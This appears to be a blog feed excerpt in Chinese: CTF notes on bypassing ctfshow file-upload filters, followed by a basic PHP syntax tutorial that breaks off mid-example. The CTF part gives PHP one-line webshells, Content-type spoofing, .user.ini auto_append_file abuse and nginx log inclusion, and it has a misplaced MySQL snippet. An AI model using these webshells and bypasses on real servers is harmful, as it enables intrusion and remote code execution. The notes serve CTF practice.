title="eval"></a>eval</h3><ol><li>eval()函数把字符串按照PHP代码来计算</li><li>该字符串必须是合法的PHP代码，以分号结尾</li><li>eval()内部写的是php代码，而system()函数内部写的是命令</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716124148.png"></li></ol><h3 id="tac-cat"><a href="#tac-cat" class="headerlink" title="tac/cat"></a>tac/cat</h3><ol><li>用来显示文件，tac是反向（向前）的顺序列出文件的内容,tac最重要的作用是对HTML的注释内容进行破坏，从而使注释内容不需要查看源代码即可回显到主页面</li><li>cat是读取其后所指文件内容并将其输出到标准输出设备上</li></ol><h3 id="-1"><a href="#-1" class="headerlink" title="@"></a>@</h3><ol><li>xxxxxxxxxx14 1（1）登录2mysql -u root –p3（2）创建新用户4create user ‘hadming‘@’%’ identified by ‘123456’;5（3）为用户授权6mysql&gt; grant all on <em>.</em> to ‘hadming‘@’%’;7（4）创建数据库8create database hadoopDB;9（5）查看数据库10show databases;11(6)选择数据库12Use hadoopDB13(7)删除数据库14（8）创建表bash</li><li>屏蔽了出错文件的路径等信息，安全性高，但是就没有回显了，所以可以不加@来获取到更多的回显信息</li></ol><h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol><li>可以接受一个post或者get传的参数,这样就可以绕过过滤掉中括号和大括号无法使用$_POST[‘shell’]的情况<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717152902.png"></p><h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol><li>查看网页源代码，查看js，发现前端过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094646.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094739.png"></li><li>修改前端js，屏蔽过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094808.png"></li><li>文件可以上传成功<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094857.png"></li><li>1=system(“ls ./“);在本地找不到东西</li><li>1=system(“ls /“);在根目录下也找不到东西<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114825.png"></li><li>1=system(“ls ../“);在上级目录找到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114952.png"></li><li>构造语句1=system(“tac ../flag.php”);看到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115039.png"></li></ol><h3 id="文件后缀绕过攻击"><a href="#文件后缀绕过攻击" class="headerlink" title="文件后缀绕过攻击"></a>文件后缀绕过攻击</h3><ol><li>服务端代码中限制了某些后缀的文件不允许上传，但是有些apache是允许解析其它文件后缀的</li><li>在apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的拓展名不能识别，就继续向左判断，直到遇到可以解析的文件后缀为止</li><li>例如：1.php.xxxx，xxxx不能解析，所以向左解析后缀php</li><li>或者可以大写一个字母，绕过弱过滤，例如php写为phP,大写一个字母</li><li>简单来说，文件上传检测的是最右侧的文件后缀名，但是apache从右到左解析，遇到右侧不能解析的文件名会跳过，知道能够解析的位置</li></ol><h3 id="文件类型绕过攻击-后端不能单一校验"><a href="#文件类型绕过攻击-后端不能单一校验" class="headerlink" title="文件类型绕过攻击,后端不能单一校验"></a>文件类型绕过攻击,后端不能单一校验</h3><ol><li>在客户端上传文件时，通过burp抓包，当上传一个php格式的文件时，和上传一个jpg格式的<strong>Content-type不一致</strong></li><li>如果<strong>服务端</strong>是<strong>通过Content-type来判断</strong>文件的类型，就存在被绕过的可能，因为Content-type的值是<strong>客户端传递的</strong>，是<strong>可以任意修改的</strong></li><li>所以上传一个php文件格式时，在burp中修改<strong>Content-type</strong>的值为image/jpeg，就可以绕过后端的检测</li></ol><h4 id="使用-FLIES-“file”-“type”-后端过滤"><a href="#使用-FLIES-“file”-“type”-后端过滤" class="headerlink" title="使用$_FLIES[“file”][“type”]后端过滤"></a>使用$_FLIES[“file”][“type”]后端过滤</h4><ol><li>$_FILES[“file”][“type”]是客户端请求数据包中的Contant-type,可以通过修改Contant-type来绕过</li><li>ctfshow例题152</li><li>直接上传，发现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716165636.png"></li><li>上来先找js有没有前端过滤，发现js有前端过滤，修改为php<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115444.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115448.png">还是不能够上传，应该就是后端有过滤了</li><li>抓个包，首先看看是不是文件名后缀的问题，<strong>大写一个字母</strong>，例如phP，发现还是被过滤掉了</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115845.png">，<strong>修改文件的Content-type</strong>,和前端所要求的文件类型一致，为image/png<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120958.png">,就可以上传成功了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716121004.png"></li></ol><h5 id="方法2：用蚁剑去连接"><a href="#方法2：用蚁剑去连接" class="headerlink" title="方法2：用蚁剑去连接"></a>方法2：用蚁剑去连接</h5><ol><li>绕过前端js过滤，后端改包之后能够上传</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004035.png"></li><li>用蚁剑去连接，右键点击添加数据，url里面填url加上上传马的路径（马所在的位置），密码为post传的参数，即shell<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004227.png">，如果出现连接成功则为ok</li><li>在上传文件管理器中单机右键，选择在此处打开终端<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004350.png"></li><li>一级一级目录地去寻找flag，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004304.png"></li></ol><h4 id="使用getimagesize-后端过滤"><a href="#使用getimagesize-后端过滤" class="headerlink" title="使用getimagesize()后端过滤"></a>使用getimagesize()后端过滤</h4><ol><li>getimagesize()可以获取到图片的宽高，如果上传的不是图片文件，getimagesize()就获取不到信息，返回false，取反!getimagesize()就为true<pre class="line-numbers language-none"><code class="language-none">if(!getimagesize($_FILES[&quot;file&quot;][&quot;type_name&quot;]))&#123;    exit();  &#x2F;&#x2F;不满足就退出&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>此时可以将一个图片和一个webshell合并为一个文件<pre class="line-numbers language-none"><code class="language-none">cat image.png webshell.php&gt;image.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>也可以用010editor放到最后</li></ol><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><ol><li>上传.user.ini进行文件上传绕过</li><li>一定注意这是一个隐藏配置文件，最前面要加点，是”.user.ini”</li></ol><h5 id="user-ini文件-常用配置项"><a href="#user-ini文件-常用配置项" class="headerlink" title=".user.ini文件,常用配置项"></a>.user.ini文件,常用配置项</h5><ol><li>php支持基于每个目录的.ini文件配置</li><li>除了主php.ini文件之外，php还会在每个目录下扫描ini文件，从被执行的php文件所在目录开始，一直上升到web根目录，（$_SERVER[‘DOCUMENT_ROOT’]所指定的），如果被执行的php文件在web根目录之外，则只扫描该目录</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011205.png"></li><li>常用配置项：S<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011252.png"></li><li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为.user.ini</li></ol><h3 id="对文件内容过滤"><a href="#对文件内容过滤" class="headerlink" title="对文件内容过滤"></a>对文件内容过滤</h3><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><ol><li>绕过php：短标签：<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; ?&gt;代替php标签，&lt;?&#x3D; ?&gt;标签可以直接把php的结果输出，&lt;?&#x3D; ?&gt;的结果和&lt;?php ?&gt;完全一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>绕过空格：使用转义字符绕过’\t’;或者使用%09也是tab的URL编码，php反引号中的字符串会被当作命令执行</li><li>绕过[]:使用{}即可，大括号和中括号的作用在php中等价<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717120017.png"></li><li>绕过[]和{}:使用array_pop()函数，函数内部写传参的方式，例如：array_pop($_POST);<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150830.png">，以字符串的形式返回执行的语句<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717151007.png">，可以配合eval()函数使用</li><li>绕过分号;:最后一句的分号可以不要，且可以使用?&gt;去绕过分号</li></ol><h4 id="不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155"><a href="#不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155" class="headerlink" title="不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155"></a>不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</h4><ol><li>上传一个png文件，抓包</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111434.png"></li><li>改包，改上传文件名称为’.user.ini’,文件内容采用’auto_append_file=1.txt’;</li><li>直接上传一个1.txt文件，内容为简单的一句话木马发现报错<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111650.png"></li><li>直接上传一个内容为php的，前端为png的文件内容，发现还是报错，二分法判断前和后哪里的问题，发现是后面不允许使用php字样</li><li>使用短标签不适用’php’字样,发现可以上传<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112101.png"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>连蚁剑，找flag即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112120.png"></li><li>连蚁剑的时候，路径写到和.user.ini和1.txt同级的位置，即到.user.ini的上一级目录，/upload的位置</li></ol><h4 id="不允许使用中括号-，ctfshow156"><a href="#不允许使用中括号-，ctfshow156" class="headerlink" title="不允许使用中括号[]，ctfshow156"></a>不允许使用中括号[]，ctfshow156</h4><ol><li>直接使用大括号{}替换中括号[]<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST&#123;&#39;shell&#39;&#125;) ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="中括号和大括号都过滤了，还过滤了分号，ctfshow157"><a href="#中括号和大括号都过滤了，还过滤了分号，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，还过滤了分号，ctfshow157"></a>中括号和大括号都过滤了，还过滤了分号，ctfshow157</h4><ol><li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，使用逃逸传参，参数以post或者get方式传入，但是还是不行<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[&#39;1&#39;]);&amp;1&#x3D;system(&quot;待执行命令&quot;));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>进一步发现过滤了分号，最后位置的语句可以不带分号结尾,即可以上传成功<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[1])?&gt;&amp;1&#x3D;system(&quot;待执行语句&quot;))?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>用蚁剑连接到*.user.ini的上一级目录位置*，开终端搞就行</li></ol><h3 id="web159，对大小括号进行过滤-对特殊路径字符进行过滤"><a href="#web159，对大小括号进行过滤-对特殊路径字符进行过滤" class="headerlink" title="web159，对大小括号进行过滤,对特殊路径字符进行过滤"></a>web159，对大小括号进行过滤,对特殊路径字符进行过滤</h3><ol><li>使用文件包含进行绕过</li><li>对’log’字样进行过滤，使用.进行拼接<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;include&#39;var&#x2F;l&#39;.&#39;og&#x2F;nginx&#x2F;access.l&#39;.&#39;og&#39;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="重复改包的技巧"><a href="#重复改包的技巧" class="headerlink" title="重复改包的技巧"></a>重复改包的技巧</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150132.png"></li><li>host的位置是域名去掉前面的http头和最后那里的‘/’而成的</li></ol><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><h4 id="使用文件包含"><a href="#使用文件包含" class="headerlink" title="使用文件包含"></a>使用文件包含</h4><ol><li>/var/log/nginx/access.log</li><li>因为对log有过滤，所以可以使用php的’.’去进行拼接</li><li>‘/var/l’.’og/nginx/access.l’.’og’</li></ol><h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol><li>题中过滤了空格，小括号</li><li>可以使用文件包含去做</li><li>先上传一个.user.ini,内容为auto_append_file=1.txt</li><li>1.txt中写一句话木马</li><li><?=include1'/var/l'.'og/nginx/access.l'.'og'?>，这个地方因为过滤了空格，我们考虑使用空白换行符，但是不能直接换行，否则解码的时候空格和换行符的URL编码相同<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728161132.png"></li><li>把上面的1位置的hex值由31改为0d即可上传</li><li>后面接着改UA，连接蚁剑即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基本语法复习</title>
      <link href="/php%E8%AF%AD%E6%B3%95/"/>
      <url>/php%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="一种创建动态交互性站点的强有力的服务端脚本语言"><a href="#一种创建动态交互性站点的强有力的服务端脚本语言" class="headerlink" title="一种创建动态交互性站点的强有力的服务端脚本语言"></a>一种创建动态交互性站点的强有力的服务端脚本语言</h2><h2 id="环境：phpstudy搭建而成"><a href="#环境：phpstudy搭建而成" class="headerlink" title="环境：phpstudy搭建而成"></a>环境：phpstudy搭建而成</h2><ol><li>在phpstudy下的WWW下的文件夹下编写php程序</li><li>保存到WWW的下一级目录下</li><li>可以使用回环地址加上php文件名运行程序</li><li>例如:127.0.0.1/文件名.php</li></ol><h2 id="什么是php文件"><a href="#什么是php文件" class="headerlink" title="什么是php文件"></a>什么是php文件</h2><ol><li>php文件可以包含文本、HTML、CSS、以及PHP代码</li><li>php代码在服务器上执行，而结果以纯文本的形式返回浏览器</li><li>文件名后缀为.php</li></ol><h2 id="php能够做什么"><a href="#php能够做什么" class="headerlink" title="php能够做什么"></a>php能够做什么</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220708183356.png"></p><h2 id="语法知识"><a href="#语法知识" class="headerlink" title="语法知识"></a>语法知识</h2><h3 id="php脚本可以放在文档中的任何位置"><a href="#php脚本可以放在文档中的任何位置" class="headerlink" title="php脚本可以放在文档中的任何位置"></a>php脚本可以放在文档中的任何位置</h3><h3 id="开头结尾"><a href="#开头结尾" class="headerlink" title="开头结尾"></a>开头结尾</h3><ol><li>php脚本以’ &lt;?php ‘开头</li><li>以’ ?&gt; ‘结尾</li></ol><h3 id="内建php输出文本函数"><a href="#内建php输出文本函数" class="headerlink" title="内建php输出文本函数"></a>内建php输出文本函数</h3><ol><li>echo<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;我的第一张 PHP 页面&lt;&#x2F;h1&gt;&lt;?phpecho &quot;Hello World!&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="php语句以分号结尾（；）"><a href="#php语句以分号结尾（；）" class="headerlink" title="php语句以分号结尾（；）"></a>php语句以分号结尾（；）</h3><ol><li>php代码块的关闭标签也会自动表明分号，因此在php代码的最后一行不必使用分号</li></ol><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol><li>php的注释和c++的注释符号一样<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;#&#x2F;*    此处为注释*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="php对大小写敏感性问题"><a href="#php对大小写敏感性问题" class="headerlink" title="php对大小写敏感性问题"></a>php对大小写敏感性问题</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;?phpECHO &quot;Hello World!&lt;br&gt;&quot;;echo &quot;Hello World!&lt;br&gt;&quot;;EcHo &quot;Hello World!&lt;br&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>以上的三种方法等价</li><li>所有<strong>用户定义的****函数，类和关键词</strong>都对大小写不敏感，例如if else echo等等</li><li>在php中所有变量都对大小写敏感,试运行以下代码<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;?php$color&#x3D;&quot;red&quot;;echo &quot;My car is &quot; . $color . &quot;&lt;br&gt;&quot;;echo &quot;My house is &quot; . $COLOR . &quot;&lt;br&gt;&quot;;echo &quot;My boat is &quot; . $coLOR . &quot;&lt;br&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h4><ol><li>变量以$符号开头，其后是变量的名称</li><li>变量名称必须以字母或者下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字下划线</li><li>变量名称对大小写敏感</li></ol><h4 id="变量的创建"><a href="#变量的创建" class="headerlink" title="变量的创建"></a>变量的创建</h4><ol><li>php没有创建变量的命令</li><li>变量会在首次赋值时被创建</li><li>如果为变量赋值为文本，用引号包围该值</li></ol><h4 id="变量的引用"><a href="#变量的引用" class="headerlink" title="变量的引用"></a>变量的引用</h4><ol><li>变量的引用也需要加‘$’</li><li>取数组中的某一个元素加大括号{数组[index]}</li></ol><h4 id="PHP-是一门类型松散的语言"><a href="#PHP-是一门类型松散的语言" class="headerlink" title="PHP 是一门类型松散的语言"></a>PHP 是一门类型松散的语言</h4><ol><li>php在创建变量的时候不必告知php变量的数据类型</li></ol><h4 id="php变量作用域"><a href="#php变量作用域" class="headerlink" title="php变量作用域"></a>php变量作用域</h4><ol><li>可以在任意位置对变量进行声明</li><li>三个作用域：<strong>local global static</strong><h5 id="local和global"><a href="#local和global" class="headerlink" title="local和global"></a>local和global</h5></li><li>global是全局作用域，可以在函数外访问</li><li>local是局部作用域，只能在函数内部进行访问</li><li>在函数外部定义的是global</li><li>函数内部定义的是local</li><li>global关键词，用于<strong>在函数内部访问全局变量</strong>，要做到这一点，要在<strong>函数内部变量前面使用global关键词</strong>，（这一点和python不同，python中global是将局部变量转换为全局变量，而php中是在函数内部<strong>调用全局变量</strong>），<strong>如果删除global，将不能在函数内部调用全局变量</strong></li><li>php同时在名为 $GLOBALS[index]的数组中存储了所有的全局变量，下标存有变量名，用 \ $GLOBALS[index]即可访问到名为index的全局变量</li></ol><h5 id="static关键词"><a href="#static关键词" class="headerlink" title="static关键词"></a>static关键词</h5><ol><li>通常，在函数完成或执行后，会删除所有变量，不过有时我需要不删除某个局部变量</li><li>使用static关键词<pre class="line-numbers language-none"><code class="language-none">&lt;?phpfunction myTest() &#123;  static $x&#x3D;0;  echo $x;  $x++;&#125;myTest();myTest();myTest();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时包含的信息（不会重新赋值）</li><li>但是这个变量仍然是局部变量</li></ol><h3 id="echo和print"><a href="#echo和print" class="headerlink" title="echo和print"></a>echo和print</h3><h4 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h4><ol><li>echo能够输出一个以上的字符串</li><li>print只能输出一个字符串，始终返回值为1</li><li>echo比print稍快，因为他不返回任何值</li></ol><h4 id="print"><a href="#print" class="headerlink" title="print"></a>print</h4><ol><li>有无括号都可使用（**print和print()**）<pre class="line-numbers language-none"><code class="language-none">&lt;?php$txt1&#x3D;&quot;Learn PHP&quot;;$txt2&#x3D;&quot;W3School.com.cn&quot;;$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;SAAB&quot;);print $txt1;print &quot;&lt;br&gt;&quot;;print &quot;Study PHP at $txt2&quot;;print &quot;My car is a &#123;$cars[0]&#125;&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>取数组中的某一个元素需要加大括号，大括号内部是数组名[index]</li></ol><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ol><li>字符串是字符序列</li><li>单双括号等价</li></ol><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h3><ol><li>返回变量的数据类型和值</li><li>值自动转化为十进制的值</li></ol><h3 id="php对象"><a href="#php对象" class="headerlink" title="php对象"></a>php对象</h3><ol><li>对象是存储数据和有关如何处理数据的信息的数据类型</li><li>php中必须明确地声明对象</li><li>首先必须声明对象的类，使用class关键词，类是包含属性和方法的结构</li><li>在对象类中定义数据类型，然后在该类的实例中使用此数据类型</li></ol><h3 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h3><ol><li>表示变量无量</li><li>NULL是NULL唯一可能的值</li><li>NULL值表示变量是否为空，用于区分字符串与空值数据库</li></ol><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h3><ol><li>返回字符串的长度<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo strlen(&quot;hello world&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="字符串中单词个数的统计"><a href="#字符串中单词个数的统计" class="headerlink" title="字符串中单词个数的统计"></a>字符串中单词个数的统计</h3><ol><li>str_word_count()<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo str_word_count(&quot;hello world&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><ol><li>用于反转字符串<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo strrev(&quot;hello world&quot;); &#x2F;&#x2F;输出dlrow olleh?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><ol><li>用于检索字符串内指定的字符或文本</li><li>如果找到匹配，则会返回首个匹配的字符位置，如果未找到，则会返回false</li><li>strpos(“原字符串”，“待检索字符串”);<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo strpos(&quot;hello world&quot;,&quot;world&quot;); &#x2F;&#x2F;输出为6，下标从0开始（很特殊的是sql中的substr）;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h3><ol><li>用一些字符串替换字符串中的另一些字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo str_replace(&quot;被替换字符&quot;,&quot;替换字符&quot;，“原string”);    echo str_replace(&quot;world&quot;,&quot;kitty&quot;,&quot;hello world&quot;); &#x2F;&#x2F;结果为hello kitty?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><h3 id="常量是单个值的标识符，脚本中无法改变该值"><a href="#常量是单个值的标识符，脚本中无法改变该值" class="headerlink" title="常量是单个值的标识符，脚本中无法改变该值"></a>常量是单个值的标识符，脚本中无法改变该值</h3><h3 id="有效的常量名以字符或下划线开头，（常量名称前面没有-符号）"><a href="#有效的常量名以字符或下划线开头，（常量名称前面没有-符号）" class="headerlink" title="有效的常量名以字符或下划线开头，（常量名称前面没有$符号）"></a>有效的常量名以字符或下划线开头，（<strong>常量名称前面没有$符号</strong>）</h3><h3 id="设置php变量"><a href="#设置php变量" class="headerlink" title="设置php变量"></a>设置php变量</h3><ol><li>define()函数，一共三个参数</li><li>首个参数定义常量的名称</li><li>第二个参数定义常量的值</li><li>第三个参数规定常量名对大小写是否敏感，默认为false<pre class="line-numbers language-none"><code class="language-none">&lt;?php    define(&quot;GREETING&quot;,&quot;Welcome&quot;)；    echo GTEETING; &#x2F;&#x2F;创建了一个对大小写不敏感的GREETING常量，值为Welcome;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="常量是全局的，而且可以贯穿整个脚本使用"><a href="#常量是全局的，而且可以贯穿整个脚本使用" class="headerlink" title="常量是全局的，而且可以贯穿整个脚本使用"></a>常量是全局的，而且可以贯穿整个脚本使用</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php    define(&quot;GREETING&quot;,&quot;Welcome&quot;);    function mytest() &#123;        echo GREETING;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>在函数内使用了一个常量，即使它在函数外定义</li></ol><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id=""><a href="#" class="headerlink" title="+ - * / %"></a>+ - * / %</h3><ol><li>$x + $y</li><li>$x - $y</li><li>$x * $y</li><li>$x / $y</li><li>$x % $y<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $x&#x3D;17;    $y&#x3D;8;    echo ($x+$y);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><ol><li>用于向变量写值</li><li>基础赋值运算符为=</li><li>右赋给左</li></ol><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><h4 id="-1"><a href="#-1" class="headerlink" title="."></a>.</h4><ol><li>. 表示串接，$txt1=”hello” $txt2=$txt1.”world”;//$txt2为hello world</li><li>.= 串接赋值，$txt1=”hello” $txt1.=”world”;//$txt1为hello world (类似于+=)</li></ol><h3 id="递增递减"><a href="#递增递减" class="headerlink" title="递增递减"></a>递增递减</h3><ol><li>++$x</li><li>–$x</li><li>$x++</li><li>$x–</li></ol><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ol><li>and</li><li>or 至少有一个就返回true</li><li>xor 有且仅有一个为true，则返回true</li><li>&amp;&amp;</li><li>||</li><li>！</li></ol><h3 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h3><ol><li><ul><li>联合</li></ul></li><li>== 相等</li><li>=== 全等</li><li>!=</li><li>&lt;&gt;</li><li>!==</li></ol><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><h3 id="if-elseif-else"><a href="#if-elseif-else" class="headerlink" title="if elseif else"></a>if elseif else</h3><pre class="line-numbers language-none"><code class="language-none">if (条件) &#123;    语句;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="if-elseif-else-1"><a href="#if-elseif-else-1" class="headerlink" title="if elseif else"></a>if elseif else</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif()&#123;&#125;elseif()&#123;&#125;else&#123;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><ol><li>有选择地执行若干代码<pre class="line-numbers language-none"><code class="language-none">switch(expression)&#123;    case label1:        expression 